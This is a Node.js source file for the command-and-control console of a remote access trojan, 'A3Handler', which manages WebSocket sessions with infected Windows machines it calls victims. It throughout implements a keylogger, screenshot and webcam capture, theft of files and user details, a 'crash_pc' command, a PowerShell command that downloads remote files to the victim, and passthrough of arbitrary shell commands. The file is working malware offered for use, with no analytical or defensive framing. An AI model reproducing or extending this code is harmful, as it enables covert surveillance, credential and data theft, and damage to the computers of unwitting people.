const WebSocket = require('ws');
const colors = require('colors');
var mkdirp = require('mkdirp');

require('events').EventEmitter.setMaxListeners = 1;
var menu = true;
var WebsocketErrorCodes = {
"1000":"CLOSE_NORMAL",
"1001":"CLOSE_GOING_AWAY",
"1002":"CLOSE_PROTOCOL_ERROR",
"1003":"CLOSE_UNSUPPORTED",
"1005":"CLOSE_NO_STATUS",
"1006":"CLOSE_ABNORMAL",
"1009":"CLOSE_TOO_LARGE"
};
var workingDir = "";
var lastWorkingDir = "";
var sessions = [];
var filename = "";
const wss = new WebSocket.Server({
	port: 4422,
	maxReceivedFrameSize: 131072,
    maxReceivedMessageSize: 10 * 1024 * 1024
});

const readline = require('readline');
var rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout,
	completer: suggestions,
	historySize: 60
});
currentSession = 0;
console.log("\n");

console.log(" ________  ________".rainbow);
console.log("|\\   __  \\|\\_____  \\".rainbow);
console.log("\\ \\  \\|\\  \\|____|\\ /_".rainbow);
console.log(" \\ \\   __  \\    \\|\\  \\".rainbow);
console.log("  \\ \\  \\ \\  \\  __\\_\\  \\".rainbow);
console.log("   \\ \\__\\ \\__\\|\\_______\\".rainbow);
console.log("    \\|__|\\|__|\\|_______|".rainbow);

console.log("\n");
console.log("CREATED BY ".trap.bold + "A".bold + ", devellopped by ".trap.bold + "A".bold + " and ".trap.bold + "H".bold);
console.log("");
console.log("[".bold + "+".green + "] Waiting for connection to server !".bold);

rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
rl.prompt();

wss.on('connection', function connection(ws, req) {
	var newId =  getUrlParams(req.url).id;
	sessions[newId] = ws;
	var lastSession = newId;
	sessions[lastSession].clientAddress = ws._socket.remoteAddress.replace("::ffff:", "");
	sessions[lastSession].sessionId = lastSession;
	sessions[lastSession].infos = getUrlParams(req.url).infos;
	if(menu){
		console.log("\n[".bold + "+".green + "] Connected to client : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + " !".bold);
		menu = false;
		currentSession = lastSession;
		console.log("[".bold + "+".green + "] Session ID : ".bold + currentSession);
		lastWorkingDir = "";
	}else{
		console.log("[".bold + "+".green + "] New client connected : ".bold + ws._socket.remoteAddress.replace("::ffff:", "").underline.green + ", client backgrounded as ID : ".bold + lastSession + " !".bold);
	}

	ws.on('message', function incoming(message) {
		if(getUrlParams(req.url).id == currentSession){
			if (typeof message == "object") {
				mkdirp('clients/' + sessions[currentSession].clientAddress + "/files", function(err) { 
					var stream = require("fs").createWriteStream('clients/' + sessions[currentSession].clientAddress + "/files" + "/" + filename);
					stream.once("open", function () {
						stream.write(message, "base64");
						stream.on('finish', function () {
							stream.close();
						});
					});
				});
			}else if(message.startsWith("##FILENAME##")){
				filename = message.replace("##FILENAME","").split("/")[message.replace("##FILENAME##","").split("/").length-1];
			}else if(message.startsWith("##LIVEKEYS##")){
				console.log(message.replace("##LIVEKEYS##","").bold);
			}else if(message.startsWith("##LOGGED##")){
				console.log(message.replace("##LOGGED##","").bold);
			}else if(message.startsWith("##MESSAGE##")){
				if(JSON.parse(message.replace("##MESSAGE##","")).type == "error"){
					console.log("[".bold + "-".red + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
				}else if(JSON.parse(message.replace("##MESSAGE##","")).type == "info"){
					console.log("[".bold + "i".yellow + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
				}
			}else if(message.startsWith("##ERROR##")){
					console.log("[".bold + "-".red + "] ".bold + message.replace("##ERROR##","").bold);
			}else if (message.startsWith("hello")) {
				workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
				lastWorkingDir = workingDir;
				rl.setPrompt(lastWorkingDir + "> ");
				rl.prompt();
			} else if (message.startsWith("##finish##")) {
				ws.send("#pwd");
			} else if (message.startsWith("##SCREENSHOT##")) {
				var base64Data = message.replace("##SCREENSHOT##", "").replace(/^data:image\/png;base64,/, "");
				mkdirp('clients/' + sessions[currentSession].clientAddress + "/screenshots/", function(err) { 
					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/screenshots/" + (new Date()).getUTCDate() + "-" + parseInt(parseInt((new Date()).getUTCMonth()) + 1) + "-" + (new Date()).getUTCFullYear() + ".png", base64Data, 'base64', function (err) {});
				});
			}else if (message.startsWith("##SPEEDTEST##")) {
				console.log("[".bold + "i".yellow + "] Victim's internet speed is ".bold + JSON.parse(message.replace("##SPEEDTEST##","")).speed.bold + "Mo/s !".bold);
			}else if (message.startsWith("##WEBCAM_SNAP##")) {
				console.log("[".bold + "+".blue + "] Photo received !".bold);
				var base64Data = message.replace("##WEBCAM_SNAP##", "").replace(/^data:image\/png;base64,/, "");
				mkdirp('clients/' + sessions[currentSession].clientAddress + "/webcam_snaps/", function(err) { 
					require("fs").writeFile('clients/' + sessions[currentSession].clientAddress + "/webcam_snaps/" + (new Date()).getUTCDate() + "-" + parseInt(parseInt((new Date()).getUTCMonth()) + 1) + "-" + (new Date()).getUTCFullYear() + ".jpeg", base64Data, 'base64', function (err) {});
				});
			}else {
				console.log(message.grey);
			}
		}
	});
	ws.on('close', function (reasonCode, description) {
		if(menu){
			console.log("\n[".bold + "-".red + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + ' disconnected !'.bold);
			if(WebsocketErrorCodes.hasOwnProperty(reasonCode)){
				console.log("[".bold + "i".yellow + "] Got error code : ".bold + WebsocketErrorCodes[reasonCode].underline + " !".bold);
			}else{
				console.log("[".bold + "i".yellow + "] Unkown error code !".bold);
			}
		}else{
			if(WebsocketErrorCodes.hasOwnProperty(reasonCode)){
				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Got error code : ".bold + WebsocketErrorCodes[reasonCode].underline + " !".bold);
			}else{
				console.log("\n[".bold + "i".yellow + "] Peer ".bold + sessions[currentSession].clientAddress.underline.red + " disconected, session ".bold + findSessionNumber(ws, sessions) + " closed. Unkown error code !".bold);
			}
			menu = true;
		}

		delete sessions[getUrlParams(req.url).id];
		rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
		rl.prompt();
	});

});

function findSessionNumber(SS, SE){
	for(obj in SE){
		if(SE[obj].clientAddress == SS._socket.remoteAddress.replace("::ffff:", "")){
			return obj;
			break;
		}
	}
}

function getUrlParams(search) {
    let hashes = search.slice(search.indexOf('?') + 1).split('&')
    let params = {}
    hashes.map(hash => {
        let [key, val] = hash.split('=')
        params[key] = decodeURIComponent(val)
    })

    return params
}

function makeId() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 10; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

function suggestions(line) {
	const completions = 'win_help exit help speedtest sessions play background get_user_infos keylogger sendkey ppal set_state current list_users list_files list_disks crash_pc upload_file screenshot download_url webcam_snap dir assoc at attrib bootcfg cd chdir chkdsk cls copy del dir diskpart driverquery echo exit fc find findstr for fsutil ftype getmac goto if ipconfig md mkdir more move net netsh netstat path pathping pause ping popd pushd powercfg reg rd rmdir ren rename sc schtasks set sfc shutdown sort start subst systeminfo taskkill tasklist tree type vssadmin xcopy'.split(' ');
	const hits = completions.filter((c) => c.startsWith(line));
	return [hits.length ? hits : completions, line];
}

rl.on('line', (line) => {
	var msg = line.trim();
	if(!menu){
		if (msg == "screenshot") {
			console.log("[".bold + "+".blue + "] Uploading screenshot (May exceed 10MO, please be patient)...".bold);
			sessions[currentSession].send(msg);
		} else if (msg == "speedtest") {
			console.log("[".bold + "+".blue + "] Speed testing...".bold);
			sessions[currentSession].send(msg);
		} else if (msg.startsWith("play")) {
			if(msg.split(" ").length == 2){
				console.log("[".bold + "+".blue + "] Request sent...".bold);
				sessions[currentSession].send("start vlc --intf dummy " + msg.split(" ")[1].replaceAll("/","\\"));
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "play <path>");
			}	
		} else if (msg == "current") {
			console.log("[".bold + "+".blue + "] Current session is : ".bold + currentSession);
			rl.prompt();
		}else if (msg.startsWith("sendkeys")) {
			if(msg.split(' ').length > 1){
				sessions[currentSession].send(msg);
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "sendkeys <keys>");
				console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "sendkeys {F4}");
					console.log("              sendkeys {A}");10555
					console.log("              sendkeys ABC");
					console.log("              sendkeys {F1}ABC{ENTER}");
					console.log("              sendkeys ^{C}");
					console.log("              ^ = ctrl");
					console.log("              % = alt");
					console.log("              + = shift");
				rl.prompt();
			}
		} else if (msg.startsWith("ppal")) {
			sessions[currentSession].send("ppal");
		} else if (msg.startsWith("keylogger")) {
			if(msg.split(" ").length == 2){
				if(msg.split(" ")[1] == "dump" || msg.split(" ")[1] == "start" || msg.split(" ")[1] == "live" || msg.split(" ")[1] == "stop"){
				sessions[currentSession].send(msg);
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "keylogger start/stop/live/dump");
					rl.prompt();
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "keylogger start/stop/live/dump");
				rl.prompt();
			}
		}else if (msg == "list_disks") {
			console.log("[".bold + "+".blue + "] Listing disks !".bold);
			sessions[currentSession].send("wmic logicaldisk get deviceid, volumename, description");
		} else if (msg.startsWith("list_files")) {
			if(msg.replace("list_files","").length > 0){
				msg = msg.split(" ")[0] + " " + msg.substr(msg.indexOf(' ') + 1).replaceAll(" ","?");
				if(msg.split(" ").length == 2){
					if((msg.split(" ")[1][1] == ":" && msg.split(" ")[1][2] == "/") || (msg.split(" ")[1][1] == ":" && msg.split(" ")[1][2] == "\\") || (msg.split(" ")[1][1] == ":" && msg.split(" ")[1].length == 2)){
						if(msg.split(" ")[1].replace(":/", "").replace(":\\","").substr(1).length > 0){
							sessions[currentSession].send(msg.split(" ")[1][0] + ": & cd \"" + msg.split(" ")[1][0] + ":/" + msg.split(" ")[1].replace(":/", "").replace(":\\","").replace(":","").substr(1).replaceAll("?"," ") + "\" & dir");
						}else{
							sessions[currentSession].send(msg.split(" ")[1][0] + ": & dir");
						}
					}else{
						sessions[currentSession].send("cd \"" + msg.split(" ")[1].replaceAll("?"," ") + "\" & dir");
					}
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "list_files <path>");
					console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "C:/Users");
					console.log("              E:/");
					console.log("              F:/");
					console.log("              /Users/user");
					rl.prompt();
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "list_files <path>");
				console.log("[".white + "i".yellow + "]".white + " Examples : ".bold + "C:/");
				console.log("               E:\\");
				console.log("               E:");
				console.log("               /Users/user");
				rl.prompt();
			}
		} else if (msg == "background") {
			console.log("[".bold + "+".blue + "] Session is now in background...".bold);
			menu = true;
			rl.setPrompt("A3".bold.underline + " A3Handler".bold.red + "# ".bold);
			rl.prompt();
		} else if (msg.startsWith("upload_file")) {
			console.log("[".bold + "+".blue + "] Uploading file (Please be patient)...".bold);
			sessions[currentSession].send(msg);
		} else if (msg.startsWith("crash_pc")) {
			if(msg.split(" ").length != 2){
				console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Usage : ".bold + "crash_pc <times (int)>");
				rl.prompt();
			}else{
				if(!isNaN(msg.split(" ")[1]) && parseInt(Number(msg.split(" ")[1])) == msg.split(" ")[1] && !isNaN(parseInt(msg.split(" ")[1], 10))){
					console.log("[".bold + "+".blue + "] Sent death request !".bold);
					sessions[currentSession].send(msg);
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong arguments !".red + " Argument : " + "<times>".bold + " needs to be an integer.");
					rl.prompt();
				}
			}
		} else if (msg.startsWith("download_url")) {
			if (msg.split(" ").length == 4) {
				var string = msg.split(" ");
				var url = string[1];
				var filename = string[2];
				var path = string[3];
				if(ValidURL(url)){
					console.log("[".white + "+".blue + "]".white + " Download request sent ! Please wait while downloading...".bold);
					sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong URL !");
					rl.prompt();
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "download_url <url> <filename> <path>");
				rl.prompt();
			}
		}else if(msg == "webcam_snap"){
			console.log("[".bold + "+".blue + "] Capturing and uploading picture (May exceed 10MO, please be patient)...".bold);
			sessions[currentSession].send(msg);
		}else if(msg == "list_users"){
			sessions[currentSession].send("net user");
		}else if(msg.startsWith("get_user_infos")){
			if(msg.split(" ").length == 2){
				sessions[currentSession].send("net user " + msg.split(" ")[1]);
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "get_user_info <username>");
				rl.prompt();
			}
		}else if(msg == "help"){
			console.log(cmdListSessions.join("\n"));
			rl.prompt();
		}else if(msg == "win_help"){
			sessions[currentSession].send("help");
		}else if(msg == "exit"){
			console.log("[".bold + "+".green + "] Type ".bold + "background".bold.cyan + " if you want to leave this session, then type ".bold + "exit".bold.cyan + " to leave the program ! ".bold);
			rl.prompt();
		}else if(msg.startsWith("set_state")){
			if(msg.split(" ").length == 2){
				if(msg.split(" ")[1] == "sleeping"){
					console.log("[".bold + "+".blue + "] Computer is going to sleep !".bold);
					sessions[currentSession].send("rundll32.exe powrprof.dll,SetSuspendState sleep");
				}else if(msg.split(" ")[1] == "hibernate"){
					console.log("[".bold + "+".blue + "] Computer is going to hibernate !".bold);
					sessions[currentSession].send("rundll32.exe powrprof.dll,SetSuspendState hibernate");
				}else{
					console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "set_state <sleeping/hibernate>");
					rl.prompt();
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "set_state <sleeping/hibernate>");
				rl.prompt();
			}
		}else{
			sessions[currentSession].send(msg);
		}
	}else{
		if(msg.startsWith("sessions")){
			if(msg.split(" ").length == 2 && msg.split(" ")[1] == "list"){
				if(Object.keys(sessions).length > 0){
					var c = 0;
					console.log("LISTING SESSIONS : ");
					for(s in sessions){
						console.log(c + " ID : ".bold + sessions[s].sessionId.bold.cyan + " IP : ".bold + sessions[s].clientAddress.bold.cyan + " V : ".bold + sessions[s].infos.bold.blue);
						c++;
					}
				}else{
					console.log("[".white + "-".red + "]".white + " No sessions !".red);
				}
			}else if(msg.split(" ").length == 3 && msg.split(" ")[1] == "connect"){
				if(sessions.hasOwnProperty(msg.split(" ")[2])){
					currentSession = msg.split(" ")[2];
					menu = false;
					lastWorkingDir = "";
					sessions[currentSession].send("SENDHELLO");
				}else{
					console.log("[".white + "-".red + "]".white + " Session ".red + msg.split(" ")[2].underline + " does not exist !".red);
				}
			}else{
				console.log("[".white + "-".red + "]".white + " Wrong arguments ! ".red + "Usage : ".bold + "sessions connect <ID>\n                              sessions list");
			}
			rl.prompt();
		}else if(msg == "help"){
			console.log(cmdListHandler.join("\n"));
			rl.prompt();
		}else if(msg == "exit"){
			console.log("[".bold + "+".green + "] Have a great day ! ".bold + "A3".underline.cyan +  " over !".bold);
			process.exit(0);
		}else{
			console.log("[".white + "-".red + "]".white + " Unkown command !".red);
			rl.prompt();
		}
	}
}).on('close', () => {
	console.log("");
	console.log("[".bold + "I".magenta + "] Next time, if you want to leave the console, type \"exit\".".bold);
	process.exit(0);
});

function ValidURL(str) {
	if(str.indexOf('http') > -1) {
	  return true;
	} else {
	  return false;
	}
  }

String.prototype.replaceAll = function(replace, by){
	var re = "";
	for(a = 0; a < this.length; a++){
		if(this[a] == replace){
			re += by;
		}else{
			re += this[a];
		}
	}
	return re;
}

var cmdListSessions = ["help => shows this message.","screenshot => take screenshot of victim's computer screen. Screenshots are located in screeshots/ClientIP folder."];
var cmdListHandler = ["help => shows this message.",""];